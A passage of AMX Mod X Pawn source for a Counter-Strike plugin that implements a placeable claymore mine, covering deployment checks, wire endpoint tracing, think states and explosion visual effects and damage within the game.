		gPlayerData[id][PL_COUNT_DELAY] = int:floatround(get_gametime());

		// Removing already put mines.
		remove_target_entity(id, ENTITY_CLASS_NAME[WPN_CLAYMORE]);
	}
	return HAM_IGNORED;
}

public Message_TextMsg(iMsgId, iMsgDest, id)
{
	new szMessage[64];
	get_msg_arg_string(2, szMessage, charsmax(szMessage));
	if (equali(szMessage, "#C4_Plant_At_Bomb_Spot"))
		return PLUGIN_HANDLED;
	return PLUGIN_CONTINUE;
}
/// =======================================================================================
/// END Custom Weapon Claymore
/// =======================================================================================
public client_putinserver(id)
{
	// Check plugin enabled.
	if (!gCvar[CVAR_ENABLE])
		return PLUGIN_CONTINUE;

	mines_reset_have_mines(id);

	return PLUGIN_CONTINUE;
}

public client_disconnected(id)
{
	remove_target_entity(id, ENTITY_CLASS_NAME[WPN_CLAYMORE]);
}

public PlayerKilled(iVictim, iAttacker)
{
	return HAM_IGNORED;
}

//====================================================
// Function: Reset Have mines.
//====================================================
stock mines_reset_have_mines(id)
{
	// reset deploy count.
	gPlayerData[id][PL_COUNT_DEPLOYED]	= int:0;
	// reset hove mines.
	cs_set_user_bpammo(id, CSW_C4, 0);
}

//====================================================
// Set Claymore Position.
//====================================================
stock mines_entity_set_position(iEnt, uID)
{
	// Vector settings.
	new Float:vOrigin	[3],Float:vViewOfs	[3];
	new	Float:vNewOrigin[3],Float:vNormal	[3],
		Float:vTraceEnd	[3],Float:vEntAngles[3];
	new Float:vDecals	[3];

	// get user position.
	pev(uID, pev_origin, 	vOrigin);
	pev(uID, pev_view_ofs, 	vViewOfs);

	velocity_by_aim(uID, 128, vTraceEnd);
	vTraceEnd[2] = -512.0;

	xs_vec_add(vOrigin, 	vViewOfs, vOrigin);
	xs_vec_add(vTraceEnd, 	vOrigin, vTraceEnd);

    // create the trace handle.
	new trace = create_tr2();
	// get wall position to vNewOrigin.
	engfunc(EngFunc_TraceLine, vOrigin, vTraceEnd, IGNORE_MONSTERS, uID, trace);
	{
		new Float:fFraction;
		get_tr2(trace, TR_flFraction, fFraction);
			
		// -- We hit something!
		if (fFraction < 1.0)
		{
			// -- Save results to be used later.
			get_tr2(trace, TR_vecEndPos, 		vTraceEnd);
			get_tr2(trace, TR_vecPlaneNormal, 	vNormal);

			if (xs_vec_distance(vOrigin, vTraceEnd) < 128.0)
			{
				// calc Decal position.
				xs_vec_add(vTraceEnd, vNormal, vDecals);

				// Claymore user Angles.
				new Float:pAngles[3];
				pev(uID, pev_angles, 	pAngles);

				// Rotate tripmine.
				vector_to_angle(vNormal, vEntAngles);
				vEntAngles[0] = 0.0;
				vEntAngles[1] = pAngles[1];
				vEntAngles[2] = 0.0;

				// calc origin.
				xs_vec_mul_scalar(vNormal, 8.0, vNormal);
				xs_vec_add(vTraceEnd, vNormal, vNewOrigin);

				// set entity position.
				engfunc(EngFunc_SetOrigin, iEnt, vNewOrigin);
				xs_vec_add(vNewOrigin, gModelMargin, vNewOrigin);

				// set angle.
				set_pev(iEnt, pev_angles, 	vEntAngles);
				CED_SetArray(iEnt, CM_DECALS, vDecals, sizeof(vDecals));

				CED_SetArray(iEnt, CM_WIRE_SPOINT, vNewOrigin, sizeof(vNewOrigin));
			}
		}
	}

    // free the trace handle.
	free_tr2(trace);
	return true;
}

Float:get_claymore_wire_endpoint(cvar)
{
	new i = 0, n = 0, iPos = 0;
	new Float:values[2];
	new sCvarValue	[20];
	new sSplit		[20];
	new sSplitLen		= charsmax(sSplit);


	formatex(sCvarValue, charsmax(sCvarValue), "%s%s", gCvar[cvar], ",");
	while((i = split_string(sCvarValue[iPos += i], ",", sSplit, sSplitLen)) != -1 && n < sizeof(values))
	{
		values[n++] = str_to_float(sSplit);
	}
	return random_float(values[0], values[1]);
}

//====================================================
// Check: common.
//====================================================
stock bool:CheckCommon(id, plData[PLAYER_DATA])
{
	// Is this player Alive?
	if (!is_user_alive(id))
		return false;

	// Can set Delay time?
	// gametime - playertime = delay count.
	new nowTime = (floatround(get_gametime()) - _:plData[PL_COUNT_DELAY]);
	if(nowTime < gCvar[CVAR_START_DELAY])
	{
		new param[1];
		param[0] = gCvar[CVAR_START_DELAY] - nowTime;
//		print_info(id, iMinesId, L_DELAY_SEC, param);
		return false;
	}
	return true;
}
//====================================================
// Check: Deploy.
//====================================================
stock bool:CheckDeploy(id)
{
	// Check common.
	if (!CheckCommon(id, gPlayerData[id]))
		return false;

	// Have mine? (use buy system)
	// if (gMinesParameter[BUY_MODE])
	{
		if (cs_get_user_bpammo(id, CSW_C4) <= 0) 
		{
//			print_info(id, L_NOT_HAVE);
			return false;
		}
	}

// 	if (!CheckMaxDeploy(id, gPlayerData[id], gMinesParameter))
// 	{
// 		return false;
// 	}
	
	return bool:CheckForDeploy(id);
}

//====================================================
// Check: Max Deploy.
//====================================================
stock bool:CheckMaxDeploy(id, plData[PLAYER_DATA], minesData[COMMON_MINES_DATA])
{
	new max_have 	= minesData[AMMO_HAVE_MAX];
	new team_max 	= minesData[DEPLOY_TEAM_MAX];
	new team_count 	= mines_get_team_deployed_count(id);

	// Max deployed per player.
	if (plData[PL_COUNT_DEPLOYED] >= int:max_have)
	{
//		print_info(id, iMinesId, L_MAX_DEPLOY);
		return false;
	}

	// Max deployed per team.
	if (team_count >= team_max)
	{
//		print_info(id, iMinesId, L_MAX_PPL);
		return false;
	}

	return true;
}
//====================================================
// Function: Count to deployed in team.
//====================================================
stock int:mines_get_team_deployed_count(id)
{
	new int:i;
	new int:count;
	new int:num;
	new team[3] = '^0';
	new players[MAX_PLAYERS];

	// Witch your team?
	switch(CsTeams:cs_get_user_team(id))
	{
		case CS_TEAM_CT: team = "CT";
		case CS_TEAM_T : team = "T";
		default:
			return int:0;
	}

	// Get your team member.
	get_players(players, num, "e", team);

	// Count your team deployed mines.
	count = int:0;
	for(i = int:0;i < num;i++)
	{
		count += gPlayerData[players[i]][PL_COUNT_DEPLOYED];
	}

	return count;
}

//====================================================
// Check: On the wall.
//====================================================
public CheckForDeploy(id)
{
	new Float:vTraceEnd[3];
	new Float:vOrigin[3];

	// Get potision.
	pev(id, pev_origin, vOrigin);
	
	// Get wall position.
	velocity_by_aim(id, 128, vTraceEnd);
	vTraceEnd[2] = -128.0;

	xs_vec_add(vTraceEnd, vOrigin, vTraceEnd);

    // create the trace handle.
	new trace = create_tr2();
	new Float:fFraction = 0.0;
	engfunc(EngFunc_TraceLine, vOrigin, vTraceEnd, IGNORE_MONSTERS, id, trace);
	{
    	get_tr2( trace, TR_flFraction, fFraction );
    }
    // free the trace handle.
	free_tr2(trace);

	// We hit something!
	if ( fFraction < 1.0 )
		return true;

//	new sLongName[MAX_NAME_LENGTH];
//	formatex(sLongName, charsmax(sLongName), "%L", id, LANG_KEY_LONGNAME);
//	client_print_color(id, id, "%L", id, LANG_KEY_PLANT_GROUND, CHAT_TAG, sLongName);

	return false;
}

public MinesBreaked(iEnt, iAttacker)
{
    return HAM_IGNORED;
}

//====================================================
// Put mines Start Progress A
//====================================================
public mines_progress_deploy(id)
{
	// Deploying Check.
	if (!CheckDeploy(id))
		return PLUGIN_HANDLED;

	new Float:wait = Float:gMinesParameter[ACTIVATE_TIME];

	if (gDeployingMines[id] == 0 || !pev_valid(gDeployingMines[id]))
	{
		new iEnt = gDeployingMines[id] = engfunc(EngFunc_CreateNamedEntity, gEntMine);
		// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

		if (pev_valid(iEnt) && !IsPlayer(iEnt))
		{
			// set classname.
			set_pev(iEnt, pev_classname, 	ENTITY_CLASS_NAME[WPN_CLAYMORE]);
			// set models.
			engfunc(EngFunc_SetModel, 		iEnt, ENT_MODELS[W_WPN]);
			// set solid.
			set_pev(iEnt, pev_solid, 		SOLID_NOT);
			// set movetype.
			set_pev(iEnt, pev_movetype, 	MOVETYPE_FLY);

			set_pev(iEnt, pev_renderfx, 	kRenderFxHologram);
			set_pev(iEnt, pev_body, 		3);
			set_pev(iEnt, pev_sequence, 	0);
			set_pev(iEnt, pev_rendermode,	kRenderTransAdd);
			set_pev(iEnt, pev_renderfx,	 	kRenderFxHologram);
			set_pev(iEnt, pev_renderamt,	255.0);
			set_pev(iEnt, pev_rendercolor,	{255.0,255.0,255.0});
			// Set Flag. start progress.
			mines_set_user_deploy_state(id, int:STATE_DEPLOYING);
			if (cs_get_user_weapon(id) == CSW_C4)
				set_pdata_float(cs_get_user_weapon_entity(id), 35, 999.0);
		}
		if (wait > 0)
			mines_show_progress(id, int:floatround(wait), g_msg_data[MSG_BARTIME]);
		// Start Task. Put mines.
		set_task_ex(wait, "SpawnMine", (TASK_PLANT + id));
	}
	else
		mines_progress_stop(id);

	return PLUGIN_HANDLED;
}
//====================================================
// Removing target put mines.
//====================================================
public mines_progress_pickup(id)
{
	// Removing Check.
	if (!CheckPickup(id))
		return PLUGIN_HANDLED;

	new Float:wait = Float:gMinesParameter[ACTIVATE_TIME];
	if (wait > 0)
		mines_show_progress(id, int:floatround(wait), g_msg_data[MSG_BARTIME]);

	// Set Flag. start progress.
	mines_set_user_deploy_state(id, int:STATE_PICKING);

	// Start Task. Remove mines.
	set_task(wait, "RemoveMine", (TASK_RELEASE + id));

	return PLUGIN_HANDLED;
}

//====================================================
// Check: Remove mines.
//====================================================
public bool:CheckPickup(id)
{
	if (!CheckCommon(id, gPlayerData[id]))
		return false;


	// have max ammo? (use buy system.)
	if (gMinesParameter[BUY_MODE])
	{
		if (cs_get_user_bpammo(id, CSW_C4) + 1 > gMinesParameter[AMMO_HAVE_MAX])
			return false;
	}

	new target;
	new Float:vOrigin[3];
	new Float:tOrigin[3];

	new body;
	get_user_aiming(id, target, body);

	// is valid target entity?
	if(!pev_valid(target))
		return false;

	// get potision. player and target.
	pev(id,		pev_origin, vOrigin);
	pev(target, pev_origin, tOrigin);

	// Distance Check. far 128.0 (cm?)
	if(get_distance_f(vOrigin, tOrigin) > 128.0)
		return false;
	
	static sClassName[32];
	static iOwner;
	pev(target, pev_classname, sClassName, charsmax(sClassName));

	// is target mines?
	if(!equali(sClassName, ENTITY_CLASS_NAME[WPN_CLAYMORE]))
		return false;

	switch(gMinesParameter[ALLOW_PICKUP])
	{
		case DISALLOW_PICKUP:
		{
//			print_info(id, iMinesId, L_NOT_PICKUP);
			return false;
		}
		case ONLY_ME:
		{
			// is owner you?
			CED_GetCell(target, CM_OWNER, iOwner);
			if(iOwner != id)
			{
//				print_info(id, iMinesId, L_NOT_PICKUP);
				return false;
			}
		}
		case ALLOW_FRIENDLY:
		{
			// is team friendly?
			if(mines_get_owner_team(target) != cs_get_user_team(id))
			{
//				print_info(id, iMinesId, L_NOT_PICKUP);
				return false;
			}
		}
	}

	// new iReturn;
	// ExecuteForward(gForwarder[FWD_CHECK_PICKUP], iReturn, id, iMinesId, target);

	// Allow Enemy.
	return true;
}

//====================================================
// Get Owner Team.
//====================================================
stock CsTeams:mines_get_owner_team(iEnt)
{
	new iOwner;
	if (!CED_GetCell(iEnt, CM_OWNER, iOwner))
		return CS_TEAM_UNASSIGNED;

	return cs_get_user_team(iOwner);
}
//====================================================
// Stopping Progress.
//====================================================
public mines_progress_stop(id)
{
	client_print(id, print_chat, "progress stop");
	if (pev_valid(gDeployingMines[id]))
		mines_remove_entity(gDeployingMines[id]);
	gDeployingMines[id] = 0;

	mines_hide_progress(id, g_msg_data[MSG_BARTIME]);
	delete_task(id);

	return PLUGIN_HANDLED;
}
stock mines_remove_entity(iEnt)
{
	if (pev_valid(iEnt))
	{
		new flag;
		new wire;
		for (new i = 0; i < 3; i++)
		{
			CED_GetCell(iEnt, CM_WIRE_ENTID[i], wire);
			set_pev(wire, pev_flags, flag | FL_KILLME);
		}

		pev(iEnt, pev_flags, flag);
		set_pev(iEnt, pev_flags, flag | FL_KILLME);
		// engfunc(EngFunc_RemoveEntity, iEnt);
	}
}

//====================================================
// Delete Task.
//====================================================
delete_task(id)
{
	if (task_exists((TASK_PLANT + id)))
		remove_task((TASK_PLANT + id));

	if (task_exists((TASK_RELEASE + id)))
		remove_task((TASK_RELEASE + id));

	mines_set_user_deploy_state(id, STATE_IDLE);

	return;
}
//====================================================
// Show Progress Bar.
//====================================================
stock mines_show_progress(id, int:time, msg)
{
	if (is_user_alive(id))
	{
		message_begin(MSG_ONE_UNRELIABLE, msg, {0.0,0.0,0.0}, id);
		write_short(time);
		message_end();
	}
}

//====================================================
// Hide Progress Bar.
//====================================================
stock mines_hide_progress(id, msg)
{
	if (is_user_alive(id))
	{
		message_begin(MSG_ONE_UNRELIABLE, msg, {0.0,0.0,0.0}, id);
		write_short(0);
		message_end();
	}
}
//====================================================
// Task: Spawn mines.
//====================================================
public SpawnMine(taskid)
{
	// Task Number to uID.
	new uID = taskid - TASK_PLANT;

	// is Valid?
	new iEnt	 = gDeployingMines[uID];
	if(!pev_valid(iEnt) || IsPlayer(iEnt))
	{
//		print_info(uID, iMinesId, L_DEBUG);
		return PLUGIN_HANDLED_MAIN;
	}

	new iReturn;
	// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

	if (mines_entity_spawn_settings(iEnt, uID))
	{
		if (mines_entity_set_position(iEnt, uID))
		{
			// Cound up. deployed.
			gPlayerData[uID][PL_COUNT_DEPLOYED]++;
			// Cound down. have ammo.
			cs_set_user_bpammo(uID, CSW_C4, cs_get_user_bpammo(uID, CSW_C4) - 1);

			// Set Flag. end progress.
			mines_set_user_deploy_state(uID, int:STATE_DEPLOYED);

		}
	}

	gDeployingMines[uID] = 0;
	custom_weapon_shot(gMinesCSXID, uID);

	return iReturn;
}
//====================================================
// claymore Settings.
//====================================================
public mines_entity_spawn_settings(iEnt, uID)
{
	// Entity Setting.
	// set class name.
	set_pev(iEnt, pev_classname, 	ENTITY_CLASS_NAME[WPN_CLAYMORE]);

	// set models.
	engfunc(EngFunc_SetModel, 		iEnt, ENT_MODELS[W_WPN]);

	// set solid.
	set_pev(iEnt, pev_solid, 		SOLID_NOT);

	// set movetype.
	set_pev(iEnt, pev_movetype, 	MOVETYPE_FLY);

	// set model animation.
	set_pev(iEnt, pev_frame,		0);
	set_pev(iEnt, pev_body, 		3);
	set_pev(iEnt, pev_sequence, 	0);
	set_pev(iEnt, pev_framerate,	0);
	set_pev(iEnt, pev_rendermode,	kRenderNormal);
	set_pev(iEnt, pev_renderfx,	 	kRenderFxNone);

	// set take damage.
	set_pev(iEnt, pev_takedamage, 	DAMAGE_YES);
	set_pev(iEnt, pev_dmg, 			100.0);

	// set size.
	engfunc(EngFunc_SetSize, 		iEnt, Float:{-6.430000, -6.690000, -13.090000 }, Float:{ 2.470000, 7.080000, 3.340000 } );

	// set entity health.
	mines_set_health(iEnt, 			gMinesParameter[MINE_HEALTH]);

	// Save results to be used later.
	CED_SetCell(iEnt,CM_OWNER,	uID);

	// Reset powoer on delay time.
	new Float:fCurrTime = get_gametime();
	CED_SetCell(iEnt, CM_POWERUP, 	fCurrTime + 2.5);
	CED_SetCell(iEnt, CM_STEP, 		POWERUP_THINK);

	// think rate. hmmm....
	set_pev(iEnt, pev_nextthink, 	fCurrTime + 0.2 );

	// Power up sound.
	cm_play_sound(iEnt, SOUND_POWERUP);

	new Float:vNewOrigin[3];
	pev(iEnt, pev_origin, vNewOrigin);

	// set laserbeam end point position.
	set_claymore_endpoint(iEnt, vNewOrigin);

	return 1;
}

//====================================================
// Claymore Wire Endpoint
//====================================================
stock set_claymore_endpoint(iEnt, Float:vOrigin[3])
{
	static Float:vAngles	[3];
	static Float:vForward	[3];
	static Float:vResult	[3][3];
	static Float:pAngles	[3];
	static Float:vFwd		[3];
	static Float:vRight		[3];
	static Float:vUp		[3];
	static Float:hitPoint	[3];
	static Float:vTmp		[3];
	static Float:distance;
	static Float:fraction;
	static Float:pitch;
	static Float:yaw;
	static n = 0;
	static trace;
	pev(iEnt, pev_angles, vAngles);
	vAngles[2] = 0.0;
	for (new i = 0; i < 3; i++)
	{
		hitPoint	= vOrigin;
		vTmp		= vOrigin;
		n = 0;

		while(n < gCvar[CVAR_CM_TRIAL_FREQ])
		{
			switch(i)
			{
				// pitch:down 0, back 90, up 180, forward 270(-90)
				// yaw  :left 90, right -90 
				case 0: // center
				{
					pitch 	= get_claymore_wire_endpoint(CVAR_CM_CENTER_PITCH);
					yaw		= get_claymore_wire_endpoint(CVAR_CM_CENTER_YAW);
				}
				case 1: // right
				{
					pitch 	= get_claymore_wire_endpoint(CVAR_CM_RIGHT_PITCH);
					yaw		= get_claymore_wire_endpoint(CVAR_CM_RIGHT_YAW);
				}
				case 2: // left
				{
					pitch 	= get_claymore_wire_endpoint(CVAR_CM_LEFT_PITCH);
					yaw		= get_claymore_wire_endpoint(CVAR_CM_LEFT_YAW);
				}
			}		

			pAngles[0] = pitch;
			pAngles[1] = -90 + yaw; 
			pAngles[2] = 0.0;

			xs_vec_add(pAngles, vAngles, pAngles);
			xs_anglevectors(pAngles, vFwd, vRight, vUp);
				
			xs_vec_mul_scalar(vFwd, gCvar[CVAR_CM_WIRE_RANGE], vFwd);
			xs_vec_add(vOrigin, vFwd, vForward);
			// xs_vec_add(vFwd, vNormal, vForward);
			// xs_vec_add(vOrigin, vForward, vForward);
			trace = create_tr2();
			// Trace line
			engfunc(EngFunc_TraceLine, vOrigin, vForward, IGNORE_MONSTERS, iEnt, trace);
			{
				get_tr2(trace, TR_vecEndPos, vTmp);
				get_tr2(trace, TR_flFraction, fraction);

				distance = xs_vec_distance(vOrigin, vTmp);
				if (distance > gCvar[CVAR_CM_WIRE_RANGE]) 
					continue;

				if (fraction < 1.0)
				{
					new block = engfunc(EngFunc_PointContents, vTmp);
					if (block != CONTENTS_SKY || block == CONTENTS_SOLID) 
					{
						if (distance > xs_vec_distance(vOrigin, hitPoint))
							hitPoint = vTmp;
					}
				}
				n++;
			}
			// free the trace handle.
			free_tr2(trace);
		}
		vResult[i] = hitPoint;
		CED_SetArray(iEnt, CM_WIRE_EPOINT[i], vResult[i], sizeof(vResult[]));
	}
}
//====================================================
// claymore Think Event.
//====================================================
public MinesThink(iEnt)
{
	if (!pev_valid(iEnt))
		return;

	static Float:fCurrTime;
	static Float:vEnd[3][3];
	static step;
	static iOwner;
	fCurrTime = get_gametime();

	if(!CED_GetCell(iEnt, CM_STEP, step))
		return;

	if(!CED_GetCell(iEnt, CM_OWNER, iOwner))
		return;

	// Get Laser line end potision.
	for (new i = 0; i < 3; i++)
		CED_GetArray(iEnt, CM_WIRE_EPOINT[i], vEnd[i], sizeof(vEnd[]));

	// claymore state.
	// Power up.
	switch(step)
	{
		case POWERUP_THINK:
			mines_step_powerup(iEnt, fCurrTime);

		case BEAMUP_THINK:
			mines_step_beamup(iEnt, vEnd, fCurrTime);
		// Laser line activated.
		case BEAMBREAK_THINK:
			mines_step_beambreak(iEnt, vEnd, fCurrTime);
		// EXPLODE
		case EXPLOSE_THINK:
		{
			// Stopping sound.
			cm_play_sound(iEnt, SOUND_STOP);

			// effect explosion.
			mines_explosion(iOwner, iEnt);
		}
	}

	return;
}
// mines_mines_explosion(id, iMinesId, iEnt);
public mines_explosion(id, iEnt)
{
	// Stopping entity to think
	set_pev(iEnt, pev_nextthink, 0.0);

	// reset deploy count.
	// Count down. deployed lasermines.
	gPlayerData[id][PL_COUNT_DEPLOYED]--;

	static sprBoom1;
	static sprBoom2;
	static sprBlast;
	static sprSmoke;
	static sprWater;
	static sprBubble;

	static Float:vOrigin[3];
	static Float:vDecals[3];

	pev(iEnt, pev_origin, 	vOrigin);
	CED_GetArray(iEnt, CM_DECALS, vDecals, sizeof(vDecals));

	sprBoom1 = (gMinesParameter[EXPLODE_SPRITE1]) 	 	? gMinesParameter[EXPLODE_SPRITE1]		: gSprites[SPR_EXPLOSION_1];
	sprBoom2 = (gMinesParameter[EXPLODE_SPRITE2]) 	 	? gMinesParameter[EXPLODE_SPRITE2]		: gSprites[SPR_EXPLOSION_2];
	sprBlast = (gMinesParameter[EXPLODE_SPRITE_BLAST])  ? gMinesParameter[EXPLODE_SPRITE_BLAST] : gSprites[SPR_BLAST];
	sprSmoke = (gMinesParameter[EXPLODE_SPRITE_SMOKE])  ? gMinesParameter[EXPLODE_SPRITE_SMOKE] : gSprites[SPR_SMOKE];
	sprWater = (gMinesParameter[EXPLODE_SPRITE_WATER])  ? gMinesParameter[EXPLODE_SPRITE_WATER] : gSprites[SPR_EXPLOSION_WATER];
	sprBubble= (gMinesParameter[EXPLODE_SPRITE_BUBBLE]) ? gMinesParameter[EXPLODE_SPRITE_BUBBLE]: gSprites[SPR_BUBBLE];

	if(engfunc(EngFunc_PointContents, vOrigin) != CONTENTS_WATER) 
	{
		mines_create_explosion	(vOrigin, Float:gMinesParameter[EXPLODE_DAMAGE], Float:gMinesParameter[EXPLODE_RADIUS], sprBoom1, sprBoom2, sprBlast);
		mines_create_smoke		(vOrigin, Float:gMinesParameter[EXPLODE_DAMAGE], Float:gMinesParameter[EXPLODE_RADIUS], sprSmoke);
	}
	else 
	{
		mines_create_water_explosion(vOrigin, Float:gMinesParameter[EXPLODE_DAMAGE], Float:gMinesParameter[EXPLODE_RADIUS], sprWater);
		mines_create_bubbles		(vOrigin, Float:gMinesParameter[EXPLODE_DAMAGE] * 1.0, Float:gMinesParameter[EXPLODE_RADIUS] * 1.0, sprBubble);
	}
	// decals
	mines_create_explosion_decals(vDecals);

	// damage.
	mines_create_explosion_damage(gMinesCSXID, iEnt, id, Float:gMinesParameter[EXPLODE_DAMAGE], Float:gMinesParameter[EXPLODE_RADIUS]);

	// remove this.
	mines_remove_entity(iEnt);
}
stock remove_target_entity(id, const className[])
{
	new iEnt = -1;
	new flags;
	while((iEnt = cs_find_ent_by_owner(iEnt, className, id)))
	{
		if (pev_valid(iEnt))
		{
			if (pev(iEnt, pev_owner) == id)
			{
				pev(iEnt, pev_flags, flags);
				set_pev(iEnt, pev_flags, flags | FL_KILLME);
				dllfunc(DLLFunc_Think, iEnt);
			}
		}
	}
}

stock mines_create_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, sprExplosion1, sprExplosion2, sprBlast) 
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 8.0;

	if(fZPos < 25.0)
		fZPos = 25.0;
	else
	if(fZPos > 500.0)
		fZPos = 500.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 32.0);

	if(iIntensity < 12)
		iIntensity = 12;
	else
	if(iIntensity > 128)
		iIntensity = 128;

	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_EXPLOSION);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprExplosion1);
	write_byte	(iIntensity);
	write_byte	(24);
	write_byte	(0);
	message_end	();

	fZPos /= 6.0;
	if(fZPos < 6.0)
		fZPos = 6.0;
	else
	if(fZPos > 96.0)
		fZPos = 96.0;

	iIntensity = (iIntensity * 7) / 4;

	if(iIntensity < 24)
		iIntensity = 24;
	else 
	if(iIntensity > 160)
		iIntensity = 160;

	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_EXPLOSION);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprExplosion2);
	write_byte	(iIntensity);
	write_byte	(20);
	write_byte	(0);
	message_end	();

	fZPos = ((((fDamage * 3.0) / 2.0) + fRadius) * 4.0) / 6.0;

	if(fZPos < 160.0)
		fZPos = 160.0;
	else 
	if(fZPos > 960.0)
		fZPos = 960.0;

	iIntensity = floatround(fRadius / 70.0);

	if(iIntensity < 3)
		iIntensity = 3;
	else 
	if(iIntensity > 10) 
		iIntensity = 10;
	
	engfunc		(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_BEAMCYLINDER);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2]);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprBlast);
	write_byte	(0);
	write_byte	(2);
	write_byte	(iIntensity);
	write_byte	(255);
	write_byte	(0);
	write_byte	(255);
	write_byte	(255);
	write_byte	(165);
	write_byte	(128);
	write_byte	(0);
	message_end	();
}
stock mines_create_water_explosion(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprExplosionWater) 
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 34.0;

	if(fZPos < 8.0)
		fZPos = 8.0;
	else
	if(fZPos > 128.0)
		fZPos = 128.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 14.0);

	if(iIntensity < 32)
		iIntensity = 32;
	else
	if(iIntensity > 164)
		iIntensity = 164;

	engfunc			(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte		(TE_EXPLOSION);
	engfunc			(EngFunc_WriteCoord, vOrigin[0]);
	engfunc			(EngFunc_WriteCoord, vOrigin[1]);
	engfunc			(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short		(sprExplosionWater);
	write_byte		(iIntensity);
	write_byte		(16);
	write_byte		(0);
	message_end		();
}
stock mines_create_smoke(const Float:vOrigin[3], const Float:fDamage, const Float:fRadius, const sprSmoke)
{
	new Float:fZPos = (fDamage + ((fRadius * 3.0) / 2.0)) / 22.0;

	if(fZPos < 8.0)
		fZPos = 8.0;
	else
	if(fZPos > 192.0)
		fZPos = 192.0;

	new iIntensity = floatround((fDamage + ((fRadius * 7.0) / 4.0)) / 11.0);

	if(iIntensity < 32)
		iIntensity = 32;
	else
	if(iIntensity > 192)
		iIntensity = 192;

	engfunc		(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte	(TE_SMOKE);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2] + fZPos);
	write_short	(sprSmoke);
	write_byte	(iIntensity);
	write_byte	(4);
	message_end	();
}

stock mines_create_explosion_decals(const Float:vOrigin[3]) 
{
	engfunc		(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, {0, 0, 0}, 0);
	write_byte	(TE_WORLDDECAL);
	engfunc		(EngFunc_WriteCoord, vOrigin[0]);
	engfunc		(EngFunc_WriteCoord, vOrigin[1]);
	engfunc		(EngFunc_WriteCoord, vOrigin[2]);
	write_byte	(gDecalIndexExplosion[random(gNumDecalsExplosion)]);
	message_end	();
}

stock mines_create_bubbles(const Float:vOrigin[3], const Float:flDamageMax, const Float:flDamageRadius, const sprBubbles) 
{
	new Float:flMaxSize = floatclamp((flDamageMax + (flDamageRadius * 1.5)) / 13.0, 24.0, 164.0);
	new Float:vMins[3], Float:vMaxs[3];
	new Float:vTemp[3];

	vTemp[0] = vTemp[1] = vTemp[2] = flMaxSize;

	xs_vec_sub(vOrigin, vTemp, vMins);
	xs_vec_add(vOrigin, vTemp, vMaxs);

	UTIL_Bubbles(vMins, vMaxs, 80, sprBubbles);
}

stock mines_create_hblood(const Float:vOrigin[3], const iDamageMax, const sprBloodSpray, const sprBlood)
{
	// new iDecalIndex = g_iBloodDecalIndex[random_num(MAX_BLOOD_DECALS - 2, MAX_BLOOD_DECALS - 1)];
	
	// message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	// write_byte(TE_WORLDDECAL)
	// write_coord(iBloodOrigin[a][0])
	// write_coord(iBloodOrigin[a][1])
	// write_coord(iTraceEndZ[a])
	// write_byte(iDecalIndex)
	// message_end()
	if (!gCvar[CVAR_VIOLENCE_HBLOOD])
		return;
	engfunc(EngFunc_MessageBegin, MSG_PAS, SVC_TEMPENTITY, vOrigin, 0);
	write_byte(TE_BLOODSPRITE);
	engfunc(EngFunc_WriteCoord, vOrigin[0]);
	engfunc(EngFunc_WriteCoord, vOrigin[1]);
	engfunc(EngFunc_WriteCoord, vOrigin[2] + random_num(-5, 20));
	write_short(sprBloodSpray);
	write_short(sprBlood);
	write_byte(248);
	write_byte(clamp(iDamageMax / 13, 5, 16));
	message_end();

	return;
}

stock UTIL_ScreenShake(Float:vOrigin[3], const Float:flAmplitude, const Float:flDuration, const Float:flFrequency, const Float:flRadius) 
{
	new iPlayers[32], iPlayersNum;
	get_players(iPlayers, iPlayersNum, "ac");

	if(iPlayersNum > 0) 
	{
		new iPlayer;
		new iAmplitude;
		new Float:flLocalAmplitude;
		new Float:flDistance;
		new Float:vPlayerOrigin[3];

		new iDuration	= FixedUnsigned16(flDuration, 1<<12);
		new iFrequency	= FixedUnsigned16(flFrequency, 1<<8);

		for(--iPlayersNum; iPlayersNum >= 0; iPlayersNum--) 
		{
			iPlayer = iPlayers[iPlayersNum];

			flLocalAmplitude = 0.0;

			if((pev(iPlayer, EV_INT_flags) & FL_ONGROUND) == 0)
				continue;

			pev(iPlayer, pev_origin, vPlayerOrigin);

			if((flDistance = get_distance_f(vOrigin, vPlayerOrigin)) < flRadius) 
				flLocalAmplitude = flAmplitude * ((flRadius - flDistance) / 100.0);

			if(flLocalAmplitude > 0.0) 
			{
				iAmplitude = FixedUnsigned16(flLocalAmplitude, 1<<12);

				static iMsgIDScreenShake;
